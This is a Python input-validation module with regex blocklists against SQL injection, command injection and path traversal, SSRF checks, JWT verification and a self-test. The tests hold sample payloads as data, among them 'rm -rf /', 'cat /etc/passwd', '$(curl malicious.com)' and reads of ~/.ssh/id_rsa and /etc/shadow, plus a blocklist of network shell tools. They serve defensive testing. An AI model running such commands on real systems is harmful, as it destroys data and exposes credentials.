"""
Input Validation and Sanitization
Prevents SQL injection, command injection, XSS, and other attacks

⚠️ CRITICAL SECURITY WARNING:
This validator uses regex blacklisting which CAN BE BYPASSED.
DO NOT use sanitize_string() for SQL queries!

For database queries, ALWAYS use parameterized queries:
    ✅ CORRECT: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    ❌ WRONG:   cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

This validator is for display/logging/non-critical validation only.
"""

import re
import html
import os
from typing import Any, Dict, List, Optional, Union
from urllib.parse import urlparse


class InputValidator:
    """
    Validates and sanitizes all user inputs to prevent injection attacks

    Protects against:
    - SQL injection
    - NoSQL injection
    - Command injection
    - XSS attacks
    - Path traversal
    - LDAP injection
    """

    # Dangerous patterns for SQL injection
    SQL_INJECTION_PATTERNS = [
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)",
        r"(--|\#|\/\*|\*\/)",  # SQL comments
        r"(\bOR\b.*=.*)",  # OR 1=1
        r"(';|--;|\bUNION\b)",  # Statement terminators
    ]

    # Dangerous patterns for command injection
    COMMAND_INJECTION_PATTERNS = [
        r"[;&|`$\(\)]",  # Shell metacharacters
        r"\$\(.*\)",  # Command substitution
        r"`.*`",  # Backtick execution
        r"(wget|curl|nc|netcat|bash|sh|powershell|cmd)",  # Dangerous commands
    ]

    # Dangerous patterns for path traversal
    PATH_TRAVERSAL_PATTERNS = [
        r"\.\./",  # Parent directory
        r"\.\.",  # Double dot
        r"~\/",  # Home directory
        r"\/etc\/",  # System files
        r"\/proc\/",  # System files
    ]

    @staticmethod
    def sanitize_string(value: str, max_length: int = 1000) -> str:
        """
        Sanitize string input

        Args:
            value: Input string
            max_length: Maximum allowed length

        Returns:
            Sanitized string

        Raises:
            ValueError: If input contains dangerous patterns
        """
        if not isinstance(value, str):
            value = str(value)

        # Limit length
        if len(value) > max_length:
            raise ValueError(f"Input too long (max {max_length} chars)")

        # Check for SQL injection
        for pattern in InputValidator.SQL_INJECTION_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                raise ValueError(f"SQL injection detected: {pattern}")

        # Check for command injection
        for pattern in InputValidator.COMMAND_INJECTION_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                raise ValueError(f"Command injection detected: {pattern}")

        # Check for path traversal
        for pattern in InputValidator.PATH_TRAVERSAL_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                raise ValueError(f"Path traversal detected: {pattern}")

        # HTML escape to prevent XSS
        value = html.escape(value)

        return value

    @staticmethod
    def sanitize_email(email: str) -> str:
        """
        Validate and sanitize email address

        Args:
            email: Email address

        Returns:
            Sanitized email

        Raises:
            ValueError: If email is invalid
        """
        if not isinstance(email, str):
            raise ValueError("Email must be string")

        # Basic email regex
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, email):
            raise ValueError("Invalid email format")

        return email.lower().strip()

    @staticmethod
    def sanitize_url(url: str) -> str:
        """
        Validate and sanitize URL

        Args:
            url: URL to validate

        Returns:
            Sanitized URL

        Raises:
            ValueError: If URL is invalid or dangerous
        """
        if not isinstance(url, str):
            raise ValueError("URL must be string")

        parsed = urlparse(url)

        # Only allow http/https
        if parsed.scheme not in ['http', 'https']:
            raise ValueError("Only HTTP/HTTPS URLs allowed")

        # Block localhost/internal IPs (SSRF protection)
        blocked_hosts = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
        if any(host in parsed.netloc.lower() for host in blocked_hosts):
            raise ValueError("Access to internal resources blocked")

        return url

    @staticmethod
    def sanitize_dict(data: Dict[str, Any], max_depth: int = 5, current_depth: int = 0) -> Dict[str, Any]:
        """
        Recursively sanitize dictionary

        Args:
            data: Dictionary to sanitize
            max_depth: Maximum nesting depth
            current_depth: Current recursion depth

        Returns:
            Sanitized dictionary

        Raises:
            ValueError: If nesting too deep or dangerous content found
        """
        if current_depth > max_depth:
            raise ValueError(f"Dictionary nesting too deep (max {max_depth})")

        sanitized = {}

        for key, value in data.items():
            # Sanitize key
            clean_key = InputValidator.sanitize_string(str(key), max_length=100)

            # Sanitize value based on type
            if isinstance(value, str):
                sanitized[clean_key] = InputValidator.sanitize_string(value)
            elif isinstance(value, dict):
                sanitized[clean_key] = InputValidator.sanitize_dict(
                    value,
                    max_depth=max_depth,
                    current_depth=current_depth + 1
                )
            elif isinstance(value, list):
                sanitized[clean_key] = [
                    InputValidator.sanitize_string(str(item)) if isinstance(item, str) else item
                    for item in value
                ]
            elif isinstance(value, (int, float, bool)) or value is None:
                sanitized[clean_key] = value
            else:
                # Convert unknown types to string and sanitize
                sanitized[clean_key] = InputValidator.sanitize_string(str(value))

        return sanitized

    @staticmethod
    def sanitize_organization_id(org_id: str) -> str:
        """
        Validate organization ID (for multi-tenant isolation)

        Args:
            org_id: Organization ID

        Returns:
            Sanitized organization ID

        Raises:
            ValueError: If org_id is invalid
        """
        if not isinstance(org_id, str):
            raise ValueError("Organization ID must be string")

        # Only allow alphanumeric, hyphens, underscores
        if not re.match(r'^[a-zA-Z0-9_-]+$', org_id):
            raise ValueError("Organization ID contains invalid characters")

        if len(org_id) > 50:
            raise ValueError("Organization ID too long")

        return org_id.strip()

    @staticmethod
    def sanitize_file_path(path: str, allowed_dirs: Optional[List[str]] = None) -> str:
        """
        Validate file path (prevent directory traversal)

        Args:
            path: File path
            allowed_dirs: List of allowed base directories

        Returns:
            Sanitized path

        Raises:
            ValueError: If path is dangerous
        """
        if not isinstance(path, str):
            raise ValueError("Path must be string")

        # Check for path traversal
        for pattern in InputValidator.PATH_TRAVERSAL_PATTERNS:
            if re.search(pattern, path):
                raise ValueError("Path traversal detected")

        # If allowed directories specified, verify path is within them
        if allowed_dirs:
            import os
            abs_path = os.path.abspath(path)

            allowed = False
            for allowed_dir in allowed_dirs:
                if abs_path.startswith(os.path.abspath(allowed_dir)):
                    allowed = True
                    break

            if not allowed:
                raise ValueError(f"Path not in allowed directories: {allowed_dirs}")

        return path

    @staticmethod
    def validate_jwt_token(token: str, secret_key: Optional[str] = None, verify_signature: bool = True) -> str:
        """
        JWT token validation with signature verification

        ⚠️ SECURITY WARNING:
        Format-only validation (verify_signature=False) is INSECURE!
        Always verify signature in production using secret_key parameter.

        Args:
            token: JWT token
            secret_key: Secret key for signature verification (from env JWT_SECRET_KEY)
            verify_signature: Whether to verify signature (default: True)

        Returns:
            Token if valid

        Raises:
            ValueError: If token is invalid or signature verification fails
        """
        if not isinstance(token, str):
            raise ValueError("Token must be string")

        # JWT format: header.payload.signature
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format (must have 3 parts)")

        # Basic length check
        if len(token) < 50 or len(token) > 2000:
            raise ValueError("JWT token length suspicious")

        # Verify signature if enabled
        if verify_signature:
            try:
                import jwt

                if not secret_key:
                    secret_key = os.getenv('JWT_SECRET_KEY')
                    if not secret_key:
                        raise ValueError(
                            "JWT_SECRET_KEY environment variable required for signature verification"
                        )

                # Verify and decode JWT
                decoded = jwt.decode(token, secret_key, algorithms=["HS256", "RS256"])

                # Check expiration
                import time
                if 'exp' in decoded and decoded['exp'] < time.time():
                    raise ValueError("JWT token expired")

            except ImportError:
                raise ValueError(
                    "PyJWT library required for signature verification. "
                    "Install with: pip install PyJWT"
                )
            except jwt.ExpiredSignatureError:
                raise ValueError("JWT token expired")
            except jwt.InvalidSignatureError:
                raise ValueError("JWT signature verification failed - token may be forged")
            except jwt.DecodeError:
                raise ValueError("JWT decode error - invalid token format")

        return token


# Global validator instance
_validator = InputValidator()


def sanitize_input(data: Union[str, Dict, List], input_type: str = "string") -> Any:
    """
    Convenience function to sanitize input

    Args:
        data: Data to sanitize
        input_type: Type of input (string, dict, email, url, etc.)

    Returns:
        Sanitized data
    """
    if input_type == "string":
        return _validator.sanitize_string(data)
    elif input_type == "dict":
        return _validator.sanitize_dict(data)
    elif input_type == "email":
        return _validator.sanitize_email(data)
    elif input_type == "url":
        return _validator.sanitize_url(data)
    elif input_type == "org_id":
        return _validator.sanitize_organization_id(data)
    elif input_type == "path":
        return _validator.sanitize_file_path(data)
    elif input_type == "jwt":
        return _validator.validate_jwt_token(data)
    else:
        raise ValueError(f"Unknown input type: {input_type}")


if __name__ == "__main__":
    print("="*60)
    print("Testing Input Validator")
    print("="*60)

    validator = InputValidator()

    # Test 1: SQL injection detection
    print("\n1️⃣  SQL Injection Tests:")

    sql_attacks = [
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM passwords--",
        "admin' OR '1'='1",
        "1; DELETE FROM users"
    ]

    for attack in sql_attacks:
        try:
            validator.sanitize_string(attack)
            print(f"  ❌ FAILED to block: {attack}")
        except ValueError as e:
            print(f"  ✅ BLOCKED: {attack}")

    # Test 2: Command injection detection
    print("\n2️⃣  Command Injection Tests:")

    cmd_attacks = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "`whoami`",
        "$(curl malicious.com)"
    ]

    for attack in cmd_attacks:
        try:
            validator.sanitize_string(attack)
            print(f"  ❌ FAILED to block: {attack}")
        except ValueError as e:
            print(f"  ✅ BLOCKED: {attack}")

    # Test 3: Path traversal detection
    print("\n3️⃣  Path Traversal Tests:")

    path_attacks = [
        "../../../etc/passwd",
        "~/.ssh/id_rsa",
        "/etc/shadow"
    ]

    for attack in path_attacks:
        try:
            validator.sanitize_string(attack)
            print(f"  ❌ FAILED to block: {attack}")
        except ValueError as e:
            print(f"  ✅ BLOCKED: {attack}")

    # Test 4: Safe inputs
    print("\n4️⃣  Safe Input Tests:")

    safe_inputs = [
        "Hello world",
        "user@example.com",
        "This is a normal sentence."
    ]

    for safe in safe_inputs:
        try:
            result = validator.sanitize_string(safe)
            print(f"  ✅ ALLOWED: {safe}")
        except ValueError as e:
            print(f"  ❌ INCORRECTLY BLOCKED: {safe}")

    print("\n" + "="*60)
    print("✅ Input Validator Working!")
    print("="*60)
